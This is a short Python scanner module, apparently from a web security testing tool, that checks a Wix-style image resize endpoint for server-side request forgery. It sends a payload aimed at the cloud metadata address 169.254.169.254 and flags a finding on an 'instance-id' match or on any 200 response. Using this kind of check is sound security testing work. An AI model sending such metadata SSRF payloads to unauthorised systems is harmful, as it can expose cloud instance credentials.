from core.finding import Finding
from utils.requester import get

class WixImageSsrfScanner:
    name = "wix_image_ssrf"

    def run(self, target):
        # Tenta fazer o servidor buscar um domínio externo (ex: webhook.site ou o próprio 127.0.0.1)
        ssrf_payload = "/_functions/resize_image?url=http://169.254.169.254/latest/meta-data/"
        url = target.rstrip('/') + ssrf_payload
        
        r = get(url)
        if r and ("instance-id" in r.text or r.status_code == 200):
            f = Finding(
                module=self.name,
                title="Potential SSRF in Image Proxy",
                severity="high",
                description="The endpoint allows fetching external URLs, which could lead to SSRF.",
                endpoint=url,
                evidence="Server responded to metadata request"
            )
            return [f.to_dict()]
        return None